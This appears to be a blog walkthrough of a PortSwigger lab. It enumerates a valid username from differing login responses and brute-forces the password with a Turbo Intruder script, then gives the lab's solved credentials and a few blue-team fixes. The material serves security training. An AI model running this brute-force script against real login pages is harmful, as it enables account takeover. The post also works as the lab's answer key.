---
layout: post
title: "PortSwigger Lab: Username enumeration via different responses"
date: 2025-07-30
categories:
  [
    "PortSwigger",
    "Authentication Vulnerabilities",
    "Vulnerabilities in password-based login",
  ]
tags:
  - "PortSwigger"
  - "Authentication Vulnerabilities"
  - "Vulnerabilities in password-based login"
  - "Username Enumeration"
  - "Brute Force"
  - "Turbo Intruder"
  - "Burp Suite"
---

# PortSwigger Lab: Username Enumeration via Different Responses

# Table of Contents

- [Overview / Goal](#overview--goal)
- [Lab Setup and Tools](#lab-setup-and-tools)
- [What's the login info?](#whats-the-login-info)
  - [Solution Steps](#solution)
- [What I'd Do Next (Blue Team)](#what-id-do-next)

# Overview / Goal {#overview--goal}

This lab is simple: enumerate a valid username, brute-force its password, then access that account page. So, **what are the login credentials?**

Wordlists provided by PortSwigger:

- https://portswigger.net/web-security/authentication/auth-lab-usernames
- https://portswigger.net/web-security/authentication/auth-lab-passwords

# Lab Setup and Tools {#lab-setup-and-tools-used}

- Burp + Firefox + FoxyProxy
- Turbo Intruder Extension

---

Capture a failing login to get the exact POST. Example captured request:

```http
POST /login HTTP/2
Content-Type: application/x-www-form-urlencoded
username=FAKE&password=FAKE
```

Response: "Invalid username" for most attempts.

# What's the Login Info? {#whats-the-login-info}

## Solution Steps {#solution}

**1) Enumerate usernames**

I moved the request to the extension Turbo Intruder and selected the fields like this: `username=%s%&password=%s%` and used the script below:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=5,
        requestsPerConnection=100,
        pipeline=False,
        engine=Engine.THREADED
    )
    for x in range(10, 20):
        engine.queue(target.req, x)
    for word in open('/home/kali/pw'):
        engine.queue(target.req, word.rstrip())
def handleResponse(req, interesting):
    table.add(req)
```

- Observation: every response had length `3292` with text "Invalid username". One candidate returned length `3294` and response "Incorrect password"! 😄

**Username:** `argentina` ✅

**2) Brute-force password**

I went back to my Turbo Intruder and set the username and password as this: `username=argentina&password=%s%`

Also, in my Python script I changed the wordlist to passwords wordlist instead of usernames. and success!

Most requests gave status code `200` but one gave `302` and that was "princess"

**Password:** `princess` ✅

**3) Verify**

- Logged into the site in Firefox with `argentina:princess`. Account page loaded and the lab was solved 😁

**Answer:** `argentina:princess` ✅

---

# What I'd Do Next (Blue Team) {#what-id-do-next}

- There is a lot I would've done differently, but to be specific for THIS lab only, I would normalize error messages, response lengths, and status codes to prevent enumeration.
- Give an absolutely generic feedback that doesn't help the attack in any way.
- Implement Rate Limiting.
